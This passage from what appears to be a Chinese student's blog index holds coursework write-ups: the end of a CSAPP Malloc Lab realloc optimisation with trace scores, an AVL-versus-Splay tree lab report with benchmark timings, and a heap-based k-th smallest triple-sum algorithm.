operator">=</span> <span class="token function">mm_malloc</span><span class="token punctuation">(</span>newsize<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">place</span><span class="token punctuation">(</span>newbp<span class="token punctuation">,</span> newsize<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>newbp<span class="token punctuation">,</span> bp<span class="token punctuation">,</span> newsize<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">mm_free</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> newbp<span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>原始的 $mm_realloc$ 没有考虑被分配块前后 $free$ $block$ 的情况, 以及 $new$ $block$ $size$ 和 $old$ $block$ $size$ 的比较, 需对此进行优化.</p></blockquote><ul><li>如果 $size$ 为 $0$, 直接调用 $mm_free$. </li><li>如果 $new$ $block$ $size$ 不大于 $old$ $block$ $size$, 直接返回原指针 $bp$ 即可.</li><li>否则, 需要考察后面邻块.<ul><li>若其未分配, 且 $size$ 和不小于 $newsize$, 则直接合并两个 $free$ $block$ 即可.</li><li>否则, 需通过 $mm_malloc$ 分配 $new$ $block$, 并进行内存 $memcpy$.</li></ul></li></ul><h3 id="Performance-2"><a href="#Performance-2" class="headerlink" title="Performance"></a>Performance</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Results <span class="token keyword">for</span> mm malloc:trace            name     valid  util     ops      secs   Kops <span class="token number">1</span>     amptjp-bal.rep       <span class="token function">yes</span>   <span class="token number">88</span>%    <span class="token number">5694</span>  <span class="token number">0.000291</span>  <span class="token number">19594</span> <span class="token number">2</span>       cccp-bal.rep       <span class="token function">yes</span>   <span class="token number">86</span>%    <span class="token number">5848</span>  <span class="token number">0.000208</span>  <span class="token number">28142</span> <span class="token number">3</span>    cp-decl-bal.rep       <span class="token function">yes</span>   <span class="token number">94</span>%    <span class="token number">6648</span>  <span class="token number">0.000386</span>  <span class="token number">17214</span> <span class="token number">4</span>       expr-bal.rep       <span class="token function">yes</span>   <span class="token number">96</span>%    <span class="token number">5380</span>  <span class="token number">0.000287</span>  <span class="token number">18739</span> <span class="token number">5</span> coalescing-bal.rep       <span class="token function">yes</span>   <span class="token number">98</span>%   <span class="token number">14400</span>  <span class="token number">0.000202</span>  <span class="token number">71111</span> <span class="token number">6</span>     random-bal.rep       <span class="token function">yes</span>   <span class="token number">88</span>%    <span class="token number">4800</span>  <span class="token number">0.000645</span>   <span class="token number">7442</span> <span class="token number">7</span>    random2-bal.rep       <span class="token function">yes</span>   <span class="token number">85</span>%    <span class="token number">4800</span>  <span class="token number">0.000747</span>   <span class="token number">6429</span> <span class="token number">8</span>     binary-bal.rep       <span class="token function">yes</span>   <span class="token number">54</span>%   <span class="token number">12000</span>  <span class="token number">0.000393</span>  <span class="token number">30519</span> <span class="token number">9</span>    binary2-bal.rep       <span class="token function">yes</span>   <span class="token number">47</span>%   <span class="token number">24000</span>  <span class="token number">0.000480</span>  <span class="token number">50042</span><span class="token number">10</span>    realloc-bal.rep       <span class="token function">yes</span>   <span class="token number">86</span>%   <span class="token number">14401</span>  <span class="token number">0.000233</span>  <span class="token number">61754</span><span class="token number">11</span>   realloc2-bal.rep       <span class="token function">yes</span>   <span class="token number">17</span>%   <span class="token number">14401</span>  <span class="token number">0.000186</span>  <span class="token number">77383</span>Total                             <span class="token number">76</span>%  <span class="token number">112372</span>  <span class="token number">0.004058</span>  <span class="token number">27692</span>Score <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">46</span> <span class="token punctuation">(</span>util<span class="token punctuation">)</span> + <span class="token number">40</span> <span class="token punctuation">(</span>thru<span class="token punctuation">))</span> * <span class="token number">11</span>/11 <span class="token punctuation">(</span>testcase<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">86</span>/100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h2><ul><li>$Malloc$ $Lab$ 需要用心 $DEBUG$, 并考验 $gdb$ 的使用掌握. </li><li>我从最简单的实现 —— $Implicit$ $Free$ $List$ 开始, 最后选择了 $Explicit$ $Free$ $List$ 进行实现. </li><li>根据不同 $trace$ 的组成, 我进行了分析与优化, 与 $Segmentation$ $Fault$ 日夜作战. </li><li>这次 $Lab$ 确实是对我的一次难得的体验!</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BBST</title>
      <link href="/2022/12/20/shu-ju-jie-gou-bbst/"/>
      <url>/2022/12/20/shu-ju-jie-gou-bbst/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-LAB3"><a href="#CST-LAB3" class="headerlink" title="CST LAB3"></a>CST LAB3</h1><h2 id="BBST"><a href="#BBST" class="headerlink" title="BBST"></a>BBST</h2><h3 id="一、数据结构"><a href="#一、数据结构" class="headerlink" title="一、数据结构"></a>一、数据结构</h3><p>我所实现的数据结构为 <code>AVLTree</code> 与 <code>SplayTree</code>, 现说明两个数据结构的核心接口与公共接口实现方法.</p><h4 id="1-AVLTree"><a href="#1-AVLTree" class="headerlink" title="1. AVLTree"></a>1. AVLTree</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">AvlNode</span> <span class="token punctuation">{</span>    AvlNode<span class="token operator">*</span> l<span class="token punctuation">;</span> <span class="token comment">// 左孩子.</span>    AvlNode<span class="token operator">*</span> r<span class="token punctuation">;</span> <span class="token comment">// 右孩子.</span>    <span class="token keyword">int</span> v<span class="token punctuation">;</span>      <span class="token comment">// 节点值.</span>    <span class="token keyword">int</span> h<span class="token punctuation">;</span>      <span class="token comment">// 节点高度.</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">AvlTree</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> cnt<span class="token punctuation">;</span>       <span class="token comment">// 节点计数器.</span>    AvlNode<span class="token operator">*</span> Root<span class="token punctuation">;</span> <span class="token comment">// 根节点.</span>    AvlNode f<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 节点数组.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考了<a href="https://www.luogu.com.cn/blog/Just-monika/solution-p3369">这篇文章</a>实现了 <code>AvlNode</code> 结构体, 并以数组形式给出 <code>AvlTree</code> 结构.</p><h5 id="1-1-Maintain"><a href="#1-1-Maintain" class="headerlink" title="1.1 Maintain()"></a>1.1 Maintain()</h5><p><code>Maintain(current)</code> 首先根据当前节点的平衡因子 <code>BanlanceFactor(current)</code> 判断是否需要调用 <code>LeftRotate()</code> 与 <code>RightRotate()</code> 接口进行左旋、右旋重构, 同时利用这两个接口实现了 <code>LeftAdjust()</code> 与 <code>RightAdjust()</code> 接口进行双旋重构.</p><h5 id="1-2-Insert-与-Remove"><a href="#1-2-Insert-与-Remove" class="headerlink" title="1.2 Insert() 与 Remove()"></a>1.2 Insert() 与 Remove()</h5><p><code>AVLTree</code> 在 <code>Insert()</code> 与 <code>Remove()</code> 后首先通过 <code>PushUp(current)</code> 进行高度更新, 将当前节点高度更新为子节点的最大高度加 $1$.</p><p><code>AVLTree</code> 在 <code>Insert()</code> 与 <code>Remove()</code> 中 <code>PushUp(current)</code>后通过 <code>Maintain(current)</code> 进行重平衡.</p><h5 id="1-3-Search"><a href="#1-3-Search" class="headerlink" title="1.3 Search()"></a>1.3 Search()</h5><p><code>AVLTree</code> 在 <code>Search()</code> 中依次判断查询值与当前节点值的大小关系, 若不相等则决定深入搜索左或右子树. 在搜索时使用 <code>AvlNode* tmp</code> 记录数值不大于查询值的最大节点. 若查询得到目标节点, 直接返回; 否则到达叶节点, 若节点值小于查询值, 根据查询方法必为数值小于查询值的最大节点, 直接返回; 若节点值大于查询值, 则返回 <code>tmp</code> 节点.</p><h5 id="1-4-复杂度分析"><a href="#1-4-复杂度分析" class="headerlink" title="1.4 复杂度分析"></a>1.4 复杂度分析</h5><p>一高度为 $h$ 的 <code>AVLTree</code> 至少有 $S(h) = fib(h) = \varPhi^h$ 个节点, 故大小为 $n$ 的 <code>AVLTree</code> 的高度为 $O(\log n)$.</p><p>每次 <code>Search()</code> 操作的复杂度正相关于树高, 为 $O(\log n)$;</p><p>每次 <code>Insert()</code> 导致的失衡通过至多一次单旋或者双旋调整即可解决, 复杂度为 $O(1)$, 总复杂度取决于搜索高度, 为 $O(\log n)$;</p><p>每次 <code>Remove()</code> 导致的失衡可能从删除节点到根节点均需进行旋转调整, 旋转次数至多为 $O(\log n)$, 总体复杂度仍为 $O(\log n)$;</p><p>综上所述, <code>AVLTree</code> 的基本操作接口的时间复杂度均为 $O(\log n)$, 共计 $n$ 次操作, 总体时间复杂度为 $O(n\log n)$.</p><h4 id="2-SplayTree"><a href="#2-SplayTree" class="headerlink" title="2. SplayTree"></a>2. SplayTree</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">SplayNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> son<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 孩子.</span>    <span class="token keyword">int</span> father<span class="token punctuation">;</span> <span class="token comment">// 父亲.</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    <span class="token comment">// 节点值.</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">SplayTree</span> <span class="token punctuation">{</span>    SplayNode t<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 节点数组.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考了<a href="https://www.luogu.com.cn/blog/cjyyb/solution-p3369">这篇文章</a>实现了 <code>SplayNode</code> 结构体, 并以数组形式给出 <code>SplayTree</code> 结构.</p><h5 id="2-1-Splay"><a href="#2-1-Splay" class="headerlink" title="2.1 Splay()"></a>2.1 Splay()</h5><p>首先实现了 <code>Rotate()</code> 接口进行单旋操作, 接着利用 <code>Rotate()</code> 接口实现了 <code>Splay()</code> 接口进行双旋操作.</p><h5 id="2-2-Insert"><a href="#2-2-Insert" class="headerlink" title="2.2 Insert()"></a>2.2 Insert()</h5><p><code>SplayTree</code> 在 <code>Insert()</code> 时逐层查询需要插入节点的位置, 直到到达叶节点. 插入节点后执行 <code>Splay(pointer, 0)</code> 将其伸展至根节点即可.</p><h5 id="2-3-Remove"><a href="#2-3-Remove" class="headerlink" title="2.3 Remove()"></a>2.3 Remove()</h5><p><code>SplayTree</code> 在 <code>Remove()</code> 中首先得到待删除节点的前驱与后继 <code>pred</code>与 <code>succ</code>. 因为预先插入了最小与最大节点, 这样的前驱与后继总是存在的. 通过 <code>Splay(pred, 0); Splay(succ, pred);</code> 将 <code>pred</code> 旋转至根节点, 并将 <code>succ</code> 旋转为其右孩子. 根据 <code>BBST</code> 的定义, 此时待删除节点必为 <code>succ</code> 的左孩子, 将其置零即可.</p><h5 id="2-4-Search"><a href="#2-4-Search" class="headerlink" title="2.4 Search()"></a>2.4 Search()</h5><p><code>SplayTree</code> 在 <code>Search()</code> 中依次判断查询值与当前节点值的大小关系, 若不相等则决定深入搜索左或右子树. 在搜索时使用 <code>int tmp</code> 记录数值不大于查询值的最大节点值. 若查询得到目标节点, 直接返回; 否则到达叶节点, 若节点值小于查询值, 根据查询方法必为数值小于查询值的最大节点, 直接返回; 若节点值大于查询值, 则返回 <code>tmp</code> 即可.</p><p>同时, <code>SplayTree</code> 对于搜索到的节点需要进行 <code>Splay()</code> 操作, 将其伸展至根节点.</p><h5 id="2-5-复杂度分析"><a href="#2-5-复杂度分析" class="headerlink" title="2.5 复杂度分析"></a>2.5 复杂度分析</h5><p>根据讲义 $P664-P668$ 对 <code>SplayTree</code> 的势能分析, 对于 <code>SplayTree</code> 的连续 $m\gg n$ 次 <code>Insert()</code>, <code>Remove()</code>, <code>Search()</code> 操作的均摊时间复杂度为 <code>O(logn)</code>.</p><h3 id="二、测例设计"><a href="#二、测例设计" class="headerlink" title="二、测例设计"></a>二、测例设计</h3><h4 id="1-测试环境"><a href="#1-测试环境" class="headerlink" title="1. 测试环境"></a>1. 测试环境</h4><p>操作系统: <code>Linux version 4.4.0-22621-Microsoft</code>.</p><p>编译器: <code>gcc version 5.4.0 (GCC)</code>.</p><h4 id="2-设计思路"><a href="#2-设计思路" class="headerlink" title="2. 设计思路"></a>2. 设计思路</h4><p>一共设计了四类测例, 存放在本地 <code>/Data</code> 路径中, 其相应生成器文件存放在本地 <code>/Generator</code> 路径中：</p><ul><li>第一类测例模拟完全随机进行插入、删除、查找操作. 操作数分别为 <code>100</code>, <code>10000</code>, <code>1000000</code> 次. 对应生成器文件为 <code>generator_1.cpp</code>, 测例文件为 <code>01.in</code> ~ <code>03.in</code>.</li><li>第二类测例模拟先插入后删除操作, 分为两组进行, 第一组 <code>80%</code> 次操作进行插入操作, <code>20%</code> 次操作进行删除操作; 第二组 <code>60%</code> 次操作进行插入操作, <code>40%</code> 操作进行删除操作. 操作数分别为 <code>100</code>, <code>10000</code>, <code>1000000</code> 次. 对应生成器文件为 <code>generator_2.cpp</code>, 测例文件为 <code>04.in</code> ~ <code>09.in</code>.</li><li>第三类测例模拟先插入后查找操作, 且查找范围为全局数值, 分为两组进行, 第一组 <code>80%</code> 次操作进行插入操作, <code>20%</code> 次操作进行全局查找操作; 第二组 <code>20%</code> 次操作进行插入操作, <code>80%</code> 操作进行全局查找操作. 操作数分别为 <code>100</code>, <code>10000</code>, <code>1000000</code> 次. 对应生成器文件为 <code>generator_3.cpp</code>, 测例文件为 <code>10.in</code> ~ <code>15.in</code>.</li><li>第四类测例模拟先插入后查找操作, 且查找范围为局部数值, 数值极差不超过总操作数的平方根, 分为两组进行, 第一组 <code>80%</code> 次操作进行插入操作, <code>20%</code> 次操作进行局部查找操作; 第二组 <code>20%</code> 次操作进行插入操作, <code>80%</code> 操作进行局部查找操作. 操作数分别为 <code>100</code>, <code>10000</code>, <code>1000000</code> 次. 对应生成器文件为 <code>generator_4.cpp</code>, 测例文件为 <code>16.in</code> ~ <code>21.in</code>.</li></ul><h4 id="3-测例生成"><a href="#3-测例生成" class="headerlink" title="3. 测例生成"></a>3. 测例生成</h4><p>使用 <code>bitmap</code> 数据结构记录 <code>Tree</code> 中数据的存在情况. 如果 <code>bitmap</code> 某一位设置为 <code>1</code>, 则相应值的节点存在于树中, 只能进行删除操作; 如果 <code>bitmap</code> 某一位设置为 <code>0</code>, 则相应值的节点不存在于树中, 只能进行插入操作。</p><pre class="line-numbers language-cpp++" data-language="cpp++"><code class="language-cpp++">// 随机数种子.srand((int)time(0));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用当前时间作为随机数种子, 充分保证了生成数据的随机性. 尝试生成一个 <code>Insert()</code> 数据点时, 随机访问一个位置, 若 <code>bitmap-&gt;test(rand_num) == 0</code>, 则可以在该处进行插入操作, 否则随机查询下一个位置; 尝试生成一个 <code>Remove()</code> 数据点时, 随机访问一个位置, 若 <code>bitmap-&gt;test(rand_num) == 1</code>, 则可以在该处进行插入操作, 否则遍历查询其之后的位置, 直到找到一个可以删除的数据点; 尝试生成一个全局 <code>Search()</code> 数据点时, 随机访问一个位置即可; 尝试生成一个局部 <code>Search()</code> 数据点时, 首先随机访问一个位置, 并在一定范围内随机生成数据即可.</p><h4 id="4-测试脚本"><a href="#4-测试脚本" class="headerlink" title="4. 测试脚本"></a>4. 测试脚本</h4><p>编写了 <code>avl.sh</code> 脚本对 <code>AVLTree</code> 数据结构进行测试.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#avl.sh</span><span class="token comment">#!/bin/bash</span><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">..</span><span class="token number">21</span><span class="token punctuation">}</span><span class="token keyword">do</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Test Case <span class="token variable">$i</span>:"</span> <span class="token operator">&gt;&gt;</span> avl.out    <span class="token punctuation">{</span> <span class="token function">time</span> ./avl <span class="token operator">&lt;</span>Data/<span class="token variable">$i</span>.in <span class="token operator">&gt;</span>Data/<span class="token variable">$i</span>.out<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;&gt;</span> avl.out<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编写了 <code>splay.sh</code> 脚本对 <code>SplayTree</code> 数据结构进行测试.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#splay.sh</span><span class="token comment">#!/bin/bash</span><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">..</span><span class="token number">21</span><span class="token punctuation">}</span><span class="token keyword">do</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Test Case <span class="token variable">$i</span>:"</span> <span class="token operator">&gt;&gt;</span> splay.out    <span class="token punctuation">{</span> <span class="token function">time</span> ./splay <span class="token operator">&lt;</span>Data/<span class="token variable">$i</span>.in <span class="token operator">&gt;</span>Data/<span class="token variable">$i</span>.out<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;&gt;</span> splay.out<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="三、性能分析"><a href="#三、性能分析" class="headerlink" title="三、性能分析"></a>三、性能分析</h3><h4 id="1-generator-1-cpp-数据"><a href="#1-generator-1-cpp-数据" class="headerlink" title="1. generator_1.cpp 数据"></a>1. <code>generator_1.cpp</code> 数据</h4><p>对应于 <code>01.in</code> ~ <code>03.in</code>.</p><div class="table-container"><table><thead><tr><th style="text-align:center">数据规模</th><th style="text-align:center">AVL</th><th style="text-align:center">Splay</th></tr></thead><tbody><tr><td style="text-align:center">1e2</td><td style="text-align:center">time:0.027s</td><td style="text-align:center">time:0.028s</td></tr><tr><td style="text-align:center">1e4</td><td style="text-align:center">time:0.026s</td><td style="text-align:center">time:0.153s</td></tr><tr><td style="text-align:center">1e6</td><td style="text-align:center">time:0.540s</td><td style="text-align:center">time:0.737s</td></tr></tbody></table></div><ul><li>在完全随机数据下, <code>AVLTree</code> 性能优于 <code>SplayTree</code>.</li><li>由于数据的随机性, <code>SplayTree</code> 数据访问的局部性差, 缓存策略效果不大, 其每次操作都需进行 $O(\log n)$ 次的旋转, 性能不如 <code>AVLTree</code>. 随着数据规模的增大, <code>AVLTree</code> 的性能优势逐渐扩大.</li></ul><h4 id="2-generator-2-cpp-数据"><a href="#2-generator-2-cpp-数据" class="headerlink" title="2. generator_2.cpp 数据"></a>2. <code>generator_2.cpp</code> 数据</h4><p>对应于 <code>04.in</code> ~ <code>09.in</code>.</p><div class="table-container"><table><thead><tr><th style="text-align:center">数据规模</th><th style="text-align:center">AVL</th><th style="text-align:center">Splay</th></tr></thead><tbody><tr><td style="text-align:center">1e2(8:2)</td><td style="text-align:center">time:0.022s</td><td style="text-align:center">time:0.015s</td></tr><tr><td style="text-align:center">1e2(6:4)</td><td style="text-align:center">time:0.021s</td><td style="text-align:center">time:0.015s</td></tr><tr><td style="text-align:center">1e4(8:2)</td><td style="text-align:center">time:0.026s</td><td style="text-align:center">time:0.023s</td></tr><tr><td style="text-align:center">1e4(6:4)</td><td style="text-align:center">time:0.025s</td><td style="text-align:center">time:0.020s</td></tr><tr><td style="text-align:center">1e6(8:2)</td><td style="text-align:center">time:1.455s</td><td style="text-align:center">time:1.730s</td></tr><tr><td style="text-align:center">1e6(6:4)</td><td style="text-align:center">time:1.273s</td><td style="text-align:center">time:2.057s</td></tr></tbody></table></div><ul><li>在先插入后删除数据下, 数据规模较小时 <code>SplayTree</code> 性能占优, 数据规模较大时 <code>AVLTree</code> 性能占优.</li><li>数据规模较小时, 两种数据结构插入与删除操作的效率相近, <code>SplayTree</code> 性能略占优; 数据规模较大时, <code>AVLTree</code> 相较 <code>SplayTree</code> 在删除操作的优势体现的更为明显.</li></ul><h4 id="3-generator-3-cpp-数据"><a href="#3-generator-3-cpp-数据" class="headerlink" title="3. generator_3.cpp 数据"></a>3. <code>generator_3.cpp</code> 数据</h4><p>对应于 <code>10.in</code> ~ <code>15.in</code>.</p><div class="table-container"><table><thead><tr><th style="text-align:center">数据规模</th><th style="text-align:center">AVL</th><th style="text-align:center">Splay</th></tr></thead><tbody><tr><td style="text-align:center">1e2(8:2)</td><td style="text-align:center">time:0.021s</td><td style="text-align:center">time:0.023s</td></tr><tr><td style="text-align:center">1e2(2:8)</td><td style="text-align:center">time:0.027s</td><td style="text-align:center">time:0.026s</td></tr><tr><td style="text-align:center">1e4(8:2)</td><td style="text-align:center">time:0.025s</td><td style="text-align:center">time:0.024s</td></tr><tr><td style="text-align:center">1e4(2:8)</td><td style="text-align:center">time:0.025s</td><td style="text-align:center">time:0.026s</td></tr><tr><td style="text-align:center">1e6(8:2)</td><td style="text-align:center">time:1.232s</td><td style="text-align:center">time:1.512s</td></tr><tr><td style="text-align:center">1e6(2:8)</td><td style="text-align:center">time:0.739s</td><td style="text-align:center">time:1.288s</td></tr></tbody></table></div><ul><li>在先插入后删除数据下, 数据规模较小时 <code>AVLTree</code> 性能略占优, 数据规模较大时 <code>AVLTree</code> 性能明显占优.</li><li>数据规模较小时, <code>AVLTree</code> 的性能略微优于 <code>SplayTree</code>. 随着数据规模的增大, 数据访问的局部性下降, <code>AVLTree</code> 和 <code>SplayTree</code> 性能均略微下降; 由于 <code>SplayTree</code> 每次操作都需进行 $O(\log n)$ 次的旋转, 受到的影响较大, 因此 <code>AVLTree</code> 性能明显占优.</li></ul><h4 id="4-generator-4-cpp-数据"><a href="#4-generator-4-cpp-数据" class="headerlink" title="4. generator_4.cpp 数据"></a>4. <code>generator_4.cpp</code> 数据</h4><p>对应于 <code>16.in</code> ~ <code>21.in</code>.</p><div class="table-container"><table><thead><tr><th style="text-align:center">数据规模</th><th style="text-align:center">AVL</th><th style="text-align:center">Splay</th></tr></thead><tbody><tr><td style="text-align:center">1e2(8:2)</td><td style="text-align:center">time:0.021s</td><td style="text-align:center">time:0.020s</td></tr><tr><td style="text-align:center">1e2(2:8)</td><td style="text-align:center">time:0.021s</td><td style="text-align:center">time:0.022s</td></tr><tr><td style="text-align:center">1e4(8:2)</td><td style="text-align:center">time:0.026s</td><td style="text-align:center">time:0.023s</td></tr><tr><td style="text-align:center">1e4(2:8)</td><td style="text-align:center">time:0.025s</td><td style="text-align:center">time:0.024s</td></tr><tr><td style="text-align:center">1e6(8:2)</td><td style="text-align:center">time:1.094s</td><td style="text-align:center">time:1.073s</td></tr><tr><td style="text-align:center">1e6(2:8)</td><td style="text-align:center">time:0.358s</td><td style="text-align:center">time:0.276s</td></tr></tbody></table></div><ul><li>在先插入后局部查找数据下, 数据规模较小时两种数据结构性能相近, 数据规模较大时 <code>SplayTree</code> 性能略占优.</li><li><code>SplayTree</code> 的理想优势在于数据访问的局部性, 在连续局部查找下, 搜索的数据越发集中, 随着数据规模的增大与查找操作比例的提高, <code>SplayTree</code> 的优势逐渐体现.</li></ul><h3 id="四、小结"><a href="#四、小结" class="headerlink" title="四、小结"></a>四、小结</h3><p>在数据较为随机或无法确定数据局部性时, 应选用 <code>AVLTree</code>, 它的时间常数小, 单次时间复杂度较为稳定. 在数据访问的局部性较强时, 应选用 <code>SplayTree</code>, 可以实现较优的性能.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Data Structure &amp; Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kth</title>
      <link href="/2022/12/13/shu-ju-jie-gou-kth/"/>
      <url>/2022/12/13/shu-ju-jie-gou-kth/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA4"><a href="#CST-PA4" class="headerlink" title="CST PA4"></a>CST PA4</h1><h2 id="4-3-Kth"><a href="#4-3-Kth" class="headerlink" title="4-3 Kth"></a>4-3 Kth</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>因为不能直接访问数组 <code>a</code>, <code>b</code>, <code>c</code> 中的元素, 我们定义数组 <code>u</code>, <code>v</code>, <code>w</code>, 将其初始化为 $\{1, 2, …, n\}$, 用于记录数组 <code>a</code>, <code>b</code>, <code>c</code> 中元素的 <code>index</code>.</p><p>将三元组视为三维空间中的点集, 我们需要返回点集之中坐标和第 <code>k</code> 小的三元组. 在 <code>compare</code> 接口中固定两维度 <code>index</code> 为 <code>1</code>, 我们可以比较单一维度的元素大小. 借此对三个数组分别进行快排, 排序结果反应在数组 <code>u</code>, <code>v</code>, <code>w</code> 中.</p><p>一般地, 若排序前数组 <code>u</code> 为 $\{1, 2, …, n\}$, 排序后为 $\{u[1], u[2], …, u[n]\}$, 即意味着数组 <code>a</code> 元素按大小升序排列为 $\{a[u[1]], a[u[2]], …, a[u[n]]\}$.</p><p>此时点集中坐标和最小的三元组即为 $a[u[1]], b[v[1]], c[w[1]]$. 我们维护一个最小堆 <code>MinHeap</code>, 将 $(1, 1, 1)$ 插入. 随后依次删除堆顶最小元组, 并插入坐标和恰好不小于删去堆顶坐标和的三元组.</p><p>第 <code>k</code> 次 <code>Delete</code> 得到的三元组 $(x, y, z)$ 对应的即是坐标和第 <code>k</code> 小的三元组 $a[u[x]], b[v[y]], c[w[z]]$.</p><p>对这个三维点集, 坐标和恰不小于 $(x, y, z)$ 的三元组必是 $(x, y, z + 1)$, $(x, y + 1, z)$, $(x + 1, y, z)$ 之一, 将其插入 <code>MinHeap</code> 即可. 考虑到同一个点可能会被压入多次, 调用 <code>k</code> 次 <code>Delete()</code> 后得到不是坐标和第 <code>k</code> 小的三元组, 特约定:</p><p>对于堆顶三元组 $(x, y, z)$, 我们插入 $(x, y, z + 1)$; 若 $z = 1$, 再插入 $(x, y + 1, z)$; 若 $y = z = 1$, 再插入 $(x + 1, y, z)$.</p><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><ul><li>在每次插入 $(x, y, z)$ 应该检查坐标是否合理, 否则会因非法插入, 使得 <code>compare</code> 函数报错.</li></ul><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p>对数组 <code>a</code>, <code>b</code>, <code>c</code> 进行快速排序, 时间复杂度为 $O(nlogn)$;</p><p>在维护 <code>MinHeap</code> 的过程中, 进行 <code>k</code> 次 <code>Delete</code>, 至多进行 <code>3k</code> 次 <code>Insert</code>, 时间复杂度为 $O(klogk)$.</p><p>综上, 算法总体时间复杂度为 $O(nlogn + klogk)$.</p><h4 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><p>数组 <code>u</code>, <code>v</code>, <code>w</code> 动态分配的空间为 $O(n)$, 堆 <code>MinHeap</code> 消耗的空间为 $O(k)$, 因此算法总体空间复杂度为 $O(n + k)$.</p><p>本题中直接在堆内开辟了相关大小的数组存储信息,</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 13</span><span class="token keyword">class</span> <span class="token class-name">MinHeap</span> <span class="token punctuation">{</span> <span class="token comment">// 实现一个三元之和最小堆.</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">private</span><span class="token operator">:</span>    <span class="token keyword">int</span> elem<span class="token punctuation">[</span><span class="token number">4000100</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>空间消耗最坏情况约为: $3\times 5\times 10^5 \times 4B + 1.2\times 10^7 \times 4B = 52MB &lt; 256MB$, 符合题目要求范围.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Data Structure &amp; Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 作业5</title>
      <link href="/2022/12/10/ji-suan-ji-xi-tong-gai-lun-zuo-ye-5/"/>
